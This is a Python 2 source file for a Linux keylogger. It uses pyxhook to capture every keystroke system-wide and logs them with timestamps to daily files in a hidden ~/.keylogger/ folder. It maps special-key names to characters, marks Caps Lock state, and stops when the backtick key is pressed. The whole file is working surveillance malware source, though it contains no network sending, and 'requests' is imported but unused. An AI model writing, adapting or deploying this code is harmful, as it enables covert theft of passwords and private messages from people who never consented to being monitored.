import pyxhook
import os
import requests
from subprocess import call
from time import *

#checks if program is starting up for first time
startup = 1
#home folder of user
homefolder = os.environ['HOME']

#path where logs are stored
filepath = homefolder + '/.keylogger/'

#creates log folder if it doesn't exist yet
if os.path.isdir(filepath) == False:
	call(['mkdir', filepath])

#file to put logs
#has timestamp which also creates a new file the next day 
log_file = filepath + strftime("%d:%m:%Y") + '.log'
print log_file
#used to see if caps is on so we can put a <CAPS> and </CAPS> tag
caps = 0

def OnKeyPress(event):

  fob=open(log_file, 'a')

  global caps
  global startup

  #checks if startup
  if startup == 1:
	fob.write('\n\\nNEW SESSION AT ' + strftime("%H:%M:%S: "))
  	startup = 0	

  #Newline if enter is pushed
  if event.Key == 'Return':
  	key = '\n\\n'
  	key += strftime("%H:%M:%S: ")
  
  #I'm sorry for this blatant DRY (Don't repeat yourself) violation
  #Makes exceptions for special characters
  elif event.Key == 'space':
  	key = ' '

  elif event.Key == 'Control_L' or event.Key == 'Control_R' or event.Key == 'Alt_L' or event.Key == 'Alt_R':
  	key = ' ' + event.Key + ' '

  elif event.Key == 'Left' or event.Key == 'Right' or event.Key == 'Shift_L' or event.Key == 'Shift_R' or event.Key == 'Up' or event.Key == 'Down':
    key = ''

  elif event.Key == 'Caps_Lock':

  	if caps == 0:
  		key = ' <CAPS> '
  		caps = 1

  	else:
  		key = ' </CAPS> '
  		caps = 0

  elif event.Key == 'exclam':
  	key = '!'

  elif event.Key == 'BackSpace':
	key = ''

  elif event.Key == 'at':
  	key = '@'

  elif event.Key == 'numbersign':
  	key = '#'

  elif event.Key == 'dollar':
  	key = '$'

  elif event.Key == 'percent':
  	key = '%'

  elif event.Key == 'asciicircum':
  	key = '^'

  elif event.Key == 'ampersand':
  	key = '&'

  elif event.Key == 'asterisk':
  	key = '*'

  elif event.Key == 'parenleft':
  	key = '('

  elif event.Key == 'parenright':
  	key = ')'

  elif event.Key == 'underscore':
  	key = '_'

  elif event.Key == 'minus':
  	key = '-'

  elif event.Key == 'equal':
  	key = '='

  elif event.Key == 'plus':
  	key = '+'

  elif event.Key == 'backslash':
  	key = '\\'

  elif event.Key == 'bar':
  	key = '|'

  elif event.Key == 'bracketright':
  	key = ']'

  elif event.Key == 'bracketleft':
  	key = '['

  elif event.Key == 'braceright':
  	key = '}'

  elif event.Key == 'braceleft':
  	key = '{'

  elif event.Key == 'apostrophe':
  	key = '\''

  elif event.Key == 'quotedbl':
  	key = '"'

  elif event.Key == 'semicolon':
  	key = ';'

  elif event.Key == 'colon':
  	key = ':'

  elif event.Key == 'slash':
  	key = '/'

  elif event.Key == 'question':
  	key = '?'

  elif event.Key == 'period':
  	key = '.'

  elif event.Key == 'greater':
  	key = '>'

  elif event.Key == 'comma':
  	key = ','

  elif event.Key == 'less':
  	key = '<'

  elif event.Key == 'asciitilede':
  	key = '~'

  else:
  	key = event.Key
  
  fob.write(key)
  
  #96 is this character: `
  if event.Ascii==96: 
    fob.write('\n')
    fob.close()
    new_hook.cancel()

#prepares hook
new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
